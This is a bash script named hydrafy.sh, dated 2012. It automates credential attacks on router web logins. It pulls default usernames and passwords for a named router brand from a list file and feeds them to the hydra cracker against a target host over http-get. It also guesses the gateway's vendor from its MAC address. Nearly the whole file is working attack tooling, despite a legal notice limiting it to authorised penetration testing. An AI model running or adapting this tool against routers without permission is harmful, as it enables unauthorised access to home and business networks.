#!/bin/bash
function script_info--()
{
##~~~~~~~~~~~~~~~~~~~~~~~~~ File and License Info ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Filename: hydrafy.sh
## Copyright (C) <2012>  <Snafu>

## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.

## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.

## You should have received a copy of the GNU General Public License
## along with this program.  If not, see <http://www.gnu.org/licenses/>.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Legal Notice ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## This script was written with the intent for Legal PenTesting uses only.
## Make sure that you have consent prior to use on a device other than your own.
## Doing so without the above is a violation of Federal/State Laws within the United States of America.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##_____________________________________________________________________________##
## Prior to usage, I ask that you take the time to read fully through the script to understand the dynamics of the script.  Don't just be a $cr!pt K!dd!3 here; actually understand what it is that you are doing.

## I consider any script/program I write to always be a work in progress.  Please send any tips/tricks/streamlining ideas/comments/kudos via email to will@configitnow.com

## Comments written with a triple # are notes to myself, please ignore them.
##_____________________________________________________________________________##


##~The Following Required Programs Must be in Your Path for Full Functionality~##
## This was decided as the de facto standard versus having the script look in locations for the programs themselves with the risk of them not being there.  Odds favor that they will be in /usr/bin or some other location readily available in your path...

## hydra
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Requested Help ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## If you know of a router/username/password that is not included in router.lst, please make the appropriate changes to spread.ods and I will update as requested.  Make sure that if a username or password is "n/a", "blank", "none" or etc, that you leave it blank in the update request.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~ Planned Implementations ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Creation of a function that will save username and passwords to seperate files if desired
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ To Do ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Development Notes ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Steps to create the lists (router.lst && oui.lst)
### Need to script the "line number" checks into a "for" statement for speed

## router.lst
## Copy each column into a new file (name, user, pass)
## Remove the trailing blank line from each file
## cat -n <file> | tail -n1 (to verify spaces properly done, they should match on the numbers!)
## paste -d '|' name user pass > router.lst
## rm name user pass

## oui.lst
## wget http://standards.ieee.org/develop/regauth/oui/oui.txt
## grep hex oui.txt > mod-oui.txt
## mv mod-oui.txt oui.txt
## awk '{print $1}' oui.txt | sed 's/-/:/g' | tr [:upper:] [:lower:] > oui
## awk '{$1="";$2="";print}' oui.txt | sed 's/^[\t]*  //' | sed 's/ /-/g' > oui-name
## open oui and oui-name with kate, import into spreadsheet, sort by oui-name A-Z
## close kate, and then overwrite oui and oui-name with the above
## Remove the trailing blank line from each file
## paste -d '|' oui-name oui > oui.lst
## rm oui-name oui oui.txt


## After some serious thought and deliberation, I decided to make this a 3 choice script
## Display the user/pass combos, Save the user/pass combos, or just save and run hydra


## Support for the Router Attack method is limited to browser-based http-get requests right now.
## If other methods of attack are wanted, shoot me some ideas on implementation and I'll give you credit where due.


## Version 7.2 of hydra can be obtained via: wget http://www.thc.org/releases/hydra-7.2-src.tar.gz


## There is now an option for -C -or- -L and -P with reference to methodology of attack


## router.lst has been parsed for duplicate values and I have removed as many of them as I could find.


## On 24 March 2012, Snakebite mode was been implemented via the -s flag during launch.
## I had intended this to be an automated form of attack via the venom that snakebite mode spits out, however the list from the IEEE is "skewed" at best with reference to the OUI company.  If I could ever get my hands on a nice list that somewhat resembles the names listed in router.lst, I will certainly script up some venom for an automated attack.


## On 5 April 2012, rtr_check--() was implemented.  Hopefully this will help to grow router.lst. 
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~## 


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Bug Traq ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Credits and Kudos ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## First and foremost, to God above for giving me the abilities I have, Amen.

## @Kos for forcing me to learn some regex

## @The_Eccentric for reigniting the spark to publish this script

## TAPE for making me look deper into regex and pointing out the 360+ duplicate usernames and passwords within router.lst

## Kudos to my wife for always standing by my side, having faith in me, and showing the greatest of patience for my obsession with hacking.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
sleep 0
}

##~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##
envir--()
{
WRN="\033[31m"   ## Warnings / Infinite Loops
INS="\033[1;32m" ## Instructions
OUT="\033[1;33m" ## Outputs
HDR="\033[1;34m" ## Headers
INP="\033[36m"   ## Inputs
}

function usage--()
{
clear
echo -e "$HDR\nHydrafy {Aka HydraFu}
Author: Snafu ----> will@configitnow.com
Version $OUT$current_ver$HDR (\033[1;33m$rel_date$HDR)$INS
Read Comments Prior to Usage"
echo -e "$INS\nUsage:
./hydrafy -s {\033[1;33mDisplay Router OUI Information$INS}

-or-

./hydrafy$INS -r$HDR <brand of router to parse for>\n"
}

rtr_check--()
{
grep -i $rtr router.lst
if [[ $? -ne 0 ]];then
	clear
	echo -e "$OUT\n$rtr is not listed in router.lst.
$INS
If $OUT$rtr$INS was not a misspell, please contribute to the hydrafy project
  by submitting any known information regarding the $OUT$rtr$INS series of routers
  (i.e.$OUT Usernames, Passwords, Spelling Variations, OUI Listings, etc$INS) to:$OUT\n
   will@configitnow.com
  $INS Subj Line:$OUT hydra\n"
	exit 0
else
	parser--
fi
}

parser--()
{
#p_value= ## Parsing style
clear
echo -e "$HDR\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-------------------------------------------------------
                     Parser Style
-------------------------------------------------------
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
1) Anywhere$INS                 [grep -i <brand of router>]$INP

2) Starts with$INS             [grep -i ^<brand of router>]$INP

3) Word match$INS             [grep -iwx <brand of router>]$INP

E)xit Script\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
read p_value
case $p_value in
	1|2|3) menu--;;
	
	e|E) exit 0;; 
	
	*) echo -e "$WRN\nYOU MUST MAKE A VALID SELECTION TO PROCEED"
	sleep 1
	parser--;;
esac
}
##~~~~~~~~~~~~~~~~~~~~~~~~~ END Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Main Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
snakebite--()
{
bite=$(route -en | grep UG | awk '{print $2}')
if [[ -z $bite ]];then
	clear
	echo -e "$WRN\n\nYou Are Not Connected to a Network that has a Router\n\n"
	sleep 2
	exit 1
else
	ping -c 1 -s 1 $bite > /dev/null
	bite=$(arp -n $bite | grep $bite | awk '{print $3}' | cut -c1-8)
	bite=$(grep $bite oui.lst | awk -F\| '{print $1}')
	clear
	echo -e "$OUT\n\n$bite$HDR is the most likely candidate for the router\n\n"
	sleep 2
	exit 0
fi
}

function menu--()
{
#selection= ## Menu Choice
clear
echo -e "$HDR\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-------------------------------------------------------
                   Hydrafy Choices
-------------------------------------------------------
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
1) Display Usernames:Passwords

2) Save Usernames:Passwords to a file

3) Implement Router Attack via Hydra

P)revious Menu

E)xit Script$HDR
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
read selection
case $selection in
	1) display--;;

	2) file_save--;;

	3) hydrafy--;;

	p|P) parser--;;

	e|E) exit 0;;

	*) echo -e "$WRN\nYOU MUST MAKE A VALID SELECTION TO PROCEED"
	sleep 1
	menu--;;
esac
}

function display--()
{
clear
echo -e "$HDR\n--------------------------------------------------------$OUT"
case $p_value in
	1) grep -i $rtr router.lst | awk -F\| '{print $2":"$3}';;

	2) grep -i ^$rtr router.lst | awk -F\| '{print $2":"$3}';;

	3) grep -iwx $rtr router.lst | awk -F\| '{print $2":"$3}';;
esac

echo -e "$HDR--------------------------------------------------------$INS

The usernames/passwords above were derived from this wordsearch:$OUT $rtr\n"
}

function file_save--()
{
#SAVE= ## Filename to save output to
clear
while [ -z $save ];do
	echo -e "$INP\nFile Name?"
	read save
done

case $p_value in
	1) grep -i $rtr router.lst | awk -F\| '{print $2":"$3}' > $save;;

	2) grep -i ^$rtr router.lst | awk -F\| '{print $2":"$3}' > $save;;

	3) grep -iwx $rtr router.lst | awk -F\| '{print $2":"$3}' > $save;;
esac

echo -e "\033[1;32m
File Written to:\033[1;33m $save\033[1;32m

The usernames/passwords above were derived from this wordsearch:\033[1;33m $rtr
"
}

function hydrafy--()
{
style= ## Method of attack
ip= ## Tgt address for hydra
at= ## path for past root
while [ -z $style ];do
	clear
	echo -e "$HDR\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-------------------------------------------------------------------------------------------
                               Username/Password Attack Style
-------------------------------------------------------------------------------------------
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
1) -C (recommended)$INS    [colon separated "login:pass" format]$WRN (Recommended)$INP

2) -L and -P$INS          [load logins and passwords from router.lst]$INP

P)revious Menu

E)xit Script$HDR
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	read style
	case $style in
		1) case $p_value in
			1) grep -i $rtr router.lst | awk -F\| '{print $2":"$3}' > snakebite.txt;;

			2) grep -i ^$rtr router.lst | awk -F\| '{print $2":"$3}' > snakebite.txt;;

			3) grep -iwx $rtr router.lst | awk -F\| '{print $2":"$3}' > snakebite.txt;;
		esac;;

		2) case $p_value in
			1) grep -i $rtr router.lst | awk -F\| '{print $2}' | sort | uniq > user.txt
			grep -i $rtr router.lst | awk -F\| '{print $3}' | sort | uniq > pass.txt;;

			2) grep -i ^$rtr router.lst | awk -F\| '{print $2}' | sort | uniq > user.txt
			grep -i ^$rtr router.lst | awk -F\| '{print $3}' | sort | uniq > pass.txt;;

			3) grep -iwx $rtr router.lst | awk -F\| '{print $2}' | sort | uniq > user.txt
			grep -iwx $rtr router.lst | awk -F\| '{print $3}' | sort | uniq > pass.txt;;
		esac;;

		p|P) menu--;;

		e|E) exit 0;;

		*) echo -e "$WRN\nYOU MUST MAKE A SELECTION TO PROCEED"
		sleep 1 
		style= ;; ## Nulled
	esac

done

clear
echo -e "$INS\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$HDR
########Example URL#########$INS
http://example.com/index.asp
-or-
http://192.168.1.1/index.asp$HDR
############################$INS

index.asp will describe the \"path past root\"$INS\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
while [ -z $ip ];do
	echo -e "$INP\nTgt IP/Hostname? ----->$INS {http:// is prepended by default}$INP <-----"
	read ip
done

while [ -z $var ];do
	echo -e "$INP\nDoes the URL extend past root? <y or n>"
	read var
	case $var in
		y|Y) extend="yes" ;;
		n|N) extend="no" ;;
		*) var= ;; ## Nulled
	esac

done

case $extend in
	yes) while [ -z $at ];do
		echo -e "$INP\nWhat is the path past root?"
		read at
	done

	case $style in
		1) hydra $ip -C snakebite.txt -t 1 -V -f http-get /"$at" ;;
		2) hydra $ip -L user.txt -P pass.txt -t 1 -V -f http-get /"$at" ;;
	esac;;


	no)
	case $style in
		1) hydra $ip -C snakebite.txt -t 1 -V -f http-get / ;;
		2) hydra $ip -L user.txt -P pass.txt -t 1 -V -f http-get / ;;
	esac;;

esac
}
##~~~~~~~~~~~~~~~~~~~~~~~~~~~ END Main Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Launch Conditions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##
current_ver="1.4"
rel_date="6 April 2012"
envir--
while getopts ":r:s" options; do
  case $options in
    r) rtr=$OPTARG;;

	s) snakebite--;;

	:) clear
	echo -e "$WRN\nOption -$OPTARG requires an argument."
	exit 1;;
  esac

done

if [[ -n "$rtr" ]]; then
	rtr_check--
else
	usage--
fi
# ##~~~~~~~~~~~~~~~~~~~~~~~~~ END Launch Conditions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##